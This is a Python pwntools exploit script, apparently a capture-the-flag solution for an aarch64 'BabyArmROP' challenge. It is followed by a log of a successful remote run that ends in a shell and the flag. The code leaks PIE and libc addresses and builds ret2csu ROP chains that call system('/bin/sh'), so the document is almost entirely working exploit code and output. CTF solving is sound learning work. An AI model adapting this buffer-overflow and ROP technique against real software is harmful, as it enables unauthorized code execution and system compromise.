from pwn import *

context(os='linux', arch='aarch64')
#context.log_level = 'debug'

BINARY = "./vuln"
elf = ELF(BINARY)

system_binsh_addr = 0x40073c # aarch64-linux-gnu-objdump -d bof1

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "pwn.zh3r0.cf"
  PORT = 1111
  s = remote(HOST, PORT)
  libc = ELF("lib/libc.so.6")
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
  context.log_level = 'debug'
  s = process("./qemu-aarch64 -g 1337 " + BINARY, shell=True)
  libc = elf.libc
else:
  s = process("./qemu-aarch64 " + BINARY, shell=True)
  libc = elf.libc

s.recvuntil("Enter your name: ")
s.sendline("A"*7)

s.recvuntil("\n")
r = s.recvuntil("\n")[:-1]
pie_leak = u64(r + b"\x00"*4)
pie_base = pie_leak - 0x8a8
print("pie_leak =", hex(pie_leak))
print("pie_base =", hex(pie_base)) 

'''
 900:	f8737aa3 	ldr	x3, [x21, x19, lsl #3]
 904:	aa1803e2 	mov	x2, x24
 908:	91000673 	add	x19, x19, #0x1
 90c:	aa1703e1 	mov	x1, x23
 910:	2a1603e0 	mov	w0, w22
 914:	d63f0060 	blr	x3
 918:	eb13029f 	cmp	x20, x19
 91c:	54ffff21 	b.ne	900 <__libc_csu_init+0x48>  // b.any
 920:	a94153f3 	ldp	x19, x20, [sp, #16]
 924:	a9425bf5 	ldp	x21, x22, [sp, #32]
 928:	a94363f7 	ldp	x23, x24, [sp, #48]
 92c:	a8c47bfd 	ldp	x29, x30, [sp], #64
 930:	d65f03c0 	ret
'''

libc_csu_init1 = pie_base + 0x920
libc_csu_init2 = pie_base + 0x900

s.recvuntil("send me your message now: ")

buf  = b"A"*0x28
buf += p64(libc_csu_init1)  # X30 __libc_csu_init1
buf += p64(0)               # X29
buf += p64(libc_csu_init2)  # X30 __libc_csu_init2
buf += p64(0)               # X19 = 0
buf += p64(1)               # X20 = 1
buf += p64(pie_base + elf.got.printf) # X21 -> X3 puts GOT
buf += p64(pie_base + elf.got.read) # X22 -> w0 1st arg
buf += p64(0)               # X23 -> X1 2nd arg
buf += p64(0)               # X24 -> x2 3rd arg
buf += p64(0)               # X29
buf += p64(pie_base + elf.sym.main) # X30 main
s.sendline(buf)

r = s.recv(4)
read_addr   = u64(r + b"\x00"*4)
libc_base   = read_addr - libc.sym.read
system_addr = libc_base + libc.sym.system
print("read_addr   =", hex(read_addr))
print("libc_base   =", hex(libc_base)) 
print("system_addr =", hex(system_addr)) 

bss_addr = pie_base + 0x11048  # $ aarch64-linux-gnu-readelf -S vuln

s.recvuntil("Enter your name: ")
s.sendline("A"*7)

s.recvuntil("send me your message now: ")

buf = b"A"*0x28
buf += p64(libc_csu_init1)  # X30 __libc_csu_init1
buf += p64(0)               # X29
buf += p64(libc_csu_init2)  # X30 __libc_csu_init2
buf += p64(0)               # X19 = 0
buf += p64(1)               # X20 = 1
buf += p64(pie_base + elf.got.read)    # X21 -> X3 gets GOT
buf += p64(0)               # X22 -> W0 1st arg
buf += p64(bss_addr)        # X23 -> X1 2nd arg bss area
buf += p64(16)              # X24 -> X2 3rd arg
buf += p64(0)               # X29
buf += p64(libc_csu_init2)  # X30 __libc_csu_init2
buf += p64(0)               # X19 = 0
buf += p64(1)               # X20 = 1
buf += p64(bss_addr)        # X21 -> X3 system
buf += p64(bss_addr+8)      # X22 -> W0 1st arg /bin/sh
buf += p64(0)               # X23 -> X1 2nd arg
buf += p64(0)               # X24 -> X2 3rd arg
s.sendline(buf)

sleep(1)
buf  = p64(system_addr)
buf += b"/bin/sh\x00"
s.sendline(buf)
s.interactive()

'''
mito@ubuntu:~/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln$ python3 solve.py r
[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/vuln'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.zh3r0.cf on port 1111: Done
[*] '/home/mito/CTF/Zh3r0_CTF_V2/Pwn_BabyArmROP/public/vuln/lib/libc.so.6'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
pie_leak = 0x6008f8a8
pie_base = 0x6008f000
read_addr   = 0xd4550f0
libc_base   = 0xd393000
system_addr = 0xd3d2218
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cd /vuln
$ ls -l
total 2084
-rw-rw-rw- 1 root root      44 Jun  3 20:50 flag
drwxrwxrwx 2 root root    4096 Jun  3 20:50 lib
-rwxrwxrwx 1 root root 2113112 Jun  3 20:50 qemu-aarch64
-rwxrwxrwx 1 root root    9528 Jun  3 20:50 vuln
$ cat flag
zh3r0{b4by_aaarch64_r0p_f04_fun_4nd_pr0fit}
'''
